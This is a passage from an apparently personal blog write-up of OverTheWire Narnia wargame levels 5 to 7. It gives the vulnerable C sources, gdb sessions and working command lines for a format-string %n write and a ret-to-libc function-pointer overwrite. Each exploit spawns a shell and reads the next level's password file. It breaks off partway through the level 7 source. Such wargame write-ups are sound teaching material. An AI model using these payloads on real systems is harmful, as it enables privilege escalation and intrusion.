	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;No way...let me give you a hint!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;buffer : [%s] (%d)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(buffer));&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;i = %d (%p)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i,&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;i);&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;A fixed sized buffer again. This time however trying to overflow it in order to
write to &lt;code&gt;i&lt;/code&gt; won&amp;rsquo;t work. If we look at line 9 and lookup the manpage for &lt;code&gt;snprintf&lt;/code&gt;
we see that&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The  functions  snprintf() and vsnprintf() write at most size bytes
(including the trailing null byte (&#39;\0&#39;)) to str.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we won&amp;rsquo;t be able to overflow this buffer. Going through the usual possible exploits
we&amp;rsquo;ve only really go one more to try: &lt;a href=&#34;https://en.wikipedia.org/wiki/Uncontrolled_format_string&#34;&gt;format string attack&lt;/a&gt; or
&lt;em&gt;uncontrolled format string vulnerability&lt;/em&gt;. This happens when user input
isn&amp;rsquo;t checked, and allows the user to use format characters (&lt;code&gt;%s&lt;/code&gt;, &lt;code&gt;%x&lt;/code&gt;) to read or
manipulate the stack.&lt;/p&gt;

&lt;p&gt;For me this is one of the harder exploits to understand, so this level is
great practice for me. So if it doesn&amp;rsquo;t make sense at first, stick with it and
try various strings. Hopefully you&amp;rsquo;ll grok it at some point.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s check to see if our hunch is right. Using a few characters to start, I
then append a list of &lt;code&gt;%x&lt;/code&gt;, which read values from the stack and print them.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa&amp;#39;+&amp;#39;%x&amp;#39;*10&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [aaaaf7eb75b6ffffffffffffd6aef7e2fbf8616161616265376636623537666] (63)
i = 1 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sure enough we see the beginning of the input string after the 4th &lt;code&gt;%x&lt;/code&gt;. So we then
put the address if &lt;code&gt;i&lt;/code&gt; into that location like and shorten the number of &lt;code&gt;%x&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*5&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8ffffd6cc] (44)
i = 1 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we have the address of &lt;code&gt;i&lt;/code&gt;, we use &lt;code&gt;%n&lt;/code&gt; to write to that address, remembering
to remove one &lt;code&gt;%x&lt;/code&gt; to keep the right length.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*4 + &amp;#39;%n&amp;#39;&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8] (36)
i = 36 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we see that we&amp;rsquo;ve written the length of the string into &lt;code&gt;i&lt;/code&gt;. We already have
a value of 36, but we need 500. To achieve this we need to pad the string.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*3 + &amp;#39;%500d&amp;#39; + &amp;#39;%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6ae                                   ] (63)
i = 528 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We&amp;rsquo;re &lt;em&gt;28&lt;/em&gt; over the target, so let&amp;rsquo;s reduce the padding&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*3 + &amp;#39;%472d&amp;#39; + &amp;#39;%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-06:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 06&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;environ;&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;// tired of fixing values...&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// - morla&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;get_sp&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
       &lt;span style=&#34;color: #f8f8f2&#34;&gt;__asm__(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;movl %esp,%eax&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n\t&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;
               &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;and $0xff000000, %eax&amp;quot;&lt;/span&gt;
               &lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[]){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;b1[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;b2[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;fp)(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;))&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;puts,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s b1 b2&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

	&lt;span style=&#34;color: #75715e&#34;&gt;/* clear environ */&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;environ[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(environ[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(environ[i]));&lt;/span&gt;
	&lt;span style=&#34;color: #75715e&#34;&gt;/* clear argz    */&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(argv[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(argv[i]));&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(b1,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(b2,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #75715e&#34;&gt;//if(((unsigned long)fp &amp;amp; 0xff000000) == 0xff000000)&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(((&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)fp&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0xff000000&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;get_sp())&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;fp(b1);&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;In this rather complicated looking listing we notice a few things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;line 17 is a function pointer to &lt;code&gt;puts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;line 33 calls the function &lt;code&gt;fp&lt;/code&gt; points to&lt;/li&gt;
&lt;li&gt;line 31 prevents &lt;code&gt;fp&lt;/code&gt; from pointing to anything in our frame&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The last lines means we need to point &lt;code&gt;fp&lt;/code&gt; to a call in a system library.
This is going to be a &lt;a href=&#34;https://en.wikipedia.org/wiki/Return-to-libc_attack&#34;&gt;ret to libc attack&lt;/a&gt;. We
need to find the location of the function we want to execute. We want a shell, so our
best option would be to execute &lt;code&gt;system(&#39;/bin/sh&#39;)&lt;/code&gt;. As luck would have it, &lt;code&gt;puts&lt;/code&gt; and
&lt;code&gt;system&lt;/code&gt; both have the same function definition: &lt;code&gt;int system(const char *command);&lt;/code&gt; and
&lt;code&gt;int puts(const char *s);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s fire up gdb and figure out our addresses.
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia6@melinda:/narnia$ gdb ./narnia6 -q
Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048559 &amp;lt;+0&amp;gt;:	push   %ebp
   0x0804855a &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x0804855c &amp;lt;+3&amp;gt;:	push   %ebx
   0x0804855d &amp;lt;+4&amp;gt;:	and    $0xfffffff0,%esp
   0x08048560 &amp;lt;+7&amp;gt;:	sub    $0x30,%esp

    &amp;lt;-- snip --&amp;gt;

   0x0804869b &amp;lt;+322&amp;gt;:	movl   $0xffffffff,(%esp)      
   0x080486a2 &amp;lt;+329&amp;gt;:	call   0x8048410 &amp;lt;exit@plt&amp;gt;
   0x080486a7 &amp;lt;+334&amp;gt;:	lea    0x20(%esp),%eax
   0x080486ab &amp;lt;+338&amp;gt;:	mov    %eax,(%esp)
   0x080486ae &amp;lt;+341&amp;gt;:	mov    0x28(%esp),%eax
   0x080486b2 &amp;lt;+345&amp;gt;:	call   *%eax                &amp;lt;-- calling *fp*
   0x080486b4 &amp;lt;+347&amp;gt;:	movl   $0x1,(%esp)
   0x080486bb &amp;lt;+354&amp;gt;:	call   0x8048410 &amp;lt;exit@plt&amp;gt;
End of assembler dump.

(gdb) break *0x080486b2
Breakpoint 1 at 0x80486b2
(gdb) r aaaaaaaabbbb ccccccccdddd
Starting program: /games/narnia/narnia6 aaaaaaaabbbb ccccccccdddd

Breakpoint 1, 0x080486b2 in main ()
(gdb) x/50wx $esp
0xffffd680:	0xffffd6a0	0xffffd8ac	0x00000021	0x08048712
0xffffd690:	0x00000003	0xffffd754	0x63636363	0x63636363
0xffffd6a0:	0x64646464	0x61616100	0x62626262	0x00000000
0xffffd6b0:	0x080486c0	0xf7fca000	0x00000000	0xf7e3ca63
0xffffd6c0:	0x00000003	0xffffd754	0xffffd764	0xf7feacea
0xffffd6d0:	0x00000003	0xffffd754	0xffffd6f4	0x08049978
0xffffd6e0:	0x08048290	0xf7fca000	0x00000000	0x00000000
0xffffd6f0:	0x00000000	0x32aaee13	0x0a932a03	0x00000000
0xffffd700:	0x00000000	0x00000000	0x00000003	0x08048450
0xffffd710:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd720:	0x00000003	0x08048450	0x00000000	0x08048471
0xffffd730:	0x08048559	0x00000003	0xffffd754	0x080486c0
0xffffd740:	0x08048730	0xf7feb180
(gdb) p system
$&lt;span style=&#34;color: #f8f8f2&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt; 0xf7e62cd0 &amp;lt;system&amp;gt;
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;What I did here was to disassemble the &lt;code&gt;main&lt;/code&gt; function and find out where
&lt;code&gt;fp&lt;/code&gt; is getting called, so that I can set a breakpoint on it. Then I
run the binary and inspect the stack before the call to &lt;code&gt;fp&lt;/code&gt;. What we see is
that &lt;code&gt;$esp&lt;/code&gt; points to &lt;code&gt;0xffffd6a0&lt;/code&gt;, which is where the last 4 values of
&lt;code&gt;b2&lt;/code&gt; are stored. This is also the argument that will be passed to the &lt;code&gt;fp&lt;/code&gt; call.
Function arguments are pushed onto the stack before a function is called. So
We want this to point to &lt;code&gt;/bin/sh&lt;/code&gt;, and we want &lt;code&gt;fp&lt;/code&gt; to point to &lt;code&gt;system&lt;/code&gt;. This is
the reason for the &lt;code&gt;p system&lt;/code&gt;, it tells us the location of &lt;code&gt;system&lt;/code&gt;.
Also note that our &lt;code&gt;segfault&lt;/code&gt; is showing us the last
4 digits of &lt;code&gt;b1&lt;/code&gt;. Perfect, I can use that to overwrite &lt;code&gt;fp&lt;/code&gt; with the address of
&lt;code&gt;system&lt;/code&gt; and I should be good to go.&lt;/p&gt;

&lt;p&gt;As this is a little more advanced, let&amp;rsquo;s go over the steps:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Get the address of the argument to whatever &lt;code&gt;fp&lt;/code&gt; points to&lt;/li&gt;
&lt;li&gt;Figure out how to overwrite that with our argument&lt;/li&gt;
&lt;li&gt;Get the address of &lt;code&gt;system&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Overwrite what &lt;code&gt;fp&lt;/code&gt; points to with &lt;code&gt;system&lt;/code&gt;&amp;rsquo;s address&lt;/li&gt;
&lt;li&gt;Assemble payload and hopefully get a shell&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So the last step:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia6@melinda:/narnia$ /games/narnia/narnia6 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;a&amp;#39;*8 + &amp;#39;\xd0\x2c\xe6\xf7&amp;#39; +&amp;#39; &amp;#39;+ &amp;#39;b&amp;#39;*8 + &amp;#39;/bin/sh&amp;#39;&amp;quot;`&lt;/span&gt;
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-07:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 07&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;goodfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;();&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;hackedfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;();&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;vuln&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;format){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf)();&lt;/span&gt;

